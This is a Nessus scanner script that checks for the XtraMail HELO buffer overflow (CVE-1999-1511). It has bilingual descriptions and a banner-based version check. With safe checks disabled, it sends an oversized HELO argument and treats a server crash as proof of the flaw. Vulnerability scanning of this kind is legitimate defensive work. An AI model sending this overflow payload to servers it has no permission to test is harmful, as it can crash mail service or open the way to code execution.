#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN

if(description)
{
 script_id(10324);
 script_bugtraq_id(791);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-1999-1511");
 
 name["english"] = "XTramail MTA 'HELO' denial";
 name["francais"] = "Déni de service 'HELO' contre le MTA Xtramail";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "There is a buffer overflow
when this MTA is issued the 'HELO' command
passed by an argument that is too long. 

The HELO command is typically one of the first
commands required by a mail server.  The command 
is used by the mail server as a first attempt to 
allow the client to identify itself.  As such, this
command occurs before there is any authentication
or validation of mailboxes, etc.   

This problem may allow an attacker to
execute arbitrary code on this computer,
or to disable your ability to send or
receive emails.

Solution : contact your vendor for a patch.

Risk factor : High";


 desc["francais"] = "Il y a un dépassement
de buffer lorsque ce MTA recoit la commande
HELO suivie d'un argument trop long. 

Ce problème peut permettre à un pirate
d'executer du code arbitraire sur
votre machine, ou peut vous empecher
d'envoyer et de recevoir des messages.

Solution : contactez votre vendeur pour
un patch.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Overflows the remote SMTP server";
 summary["francais"] = "Overflow le serveur SMTP distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "SMTP problems";
 family["francais"] = "Problèmes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl", "slmail_helo.nasl", "csm_helo.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");
port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(safe_checks())
{
 banner = get_smtp_banner(port:port);
 if(banner)
 {
  b = tolower(banner);
  if("xtramail" >< b)
  {
  if( egrep(pattern:".*1\.([0-9]|1[0-1])[^0-9].*",
   	string:b)
    )
    {
     data = "
The remote smtp server is Xtramail 1.11 or older.
This version is known for being vulnerable to a buffer
overflow in the HELO command.
	
This *may* allow an attacker to execute arbitrary commands
as root on the remote SMTP server.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : upgrade 
Risk factor : High";
     security_hole(port:port, data:data);
    }
  }
 }
 exit(0);
}




if(get_port_state(port))
{
 key = get_kb_item(string("SMTP/", port, "/helo_overflow"));
 if(key) exit(0);
 soc = open_sock_tcp(port);
 if(soc)
 {
  s = smtp_recv_banner(socket:soc);
  if(!s)exit(0);
  if(!("220 " >< s)){
  	close(soc);
	exit(0);
	}
  c = string("HELO ", crap(15000), "\r\n");
  send(socket:soc, data:c);
  s = recv_line(socket:soc, length:1024);
  if(!s)
  {
    close(soc);
    soc = open_sock_tcp(port);
    if(soc) s = smtp_recv_banner(socket:soc);
    else s = NULL;
    if(!s)security_hole(port);
  }
    close(soc);
 }
}
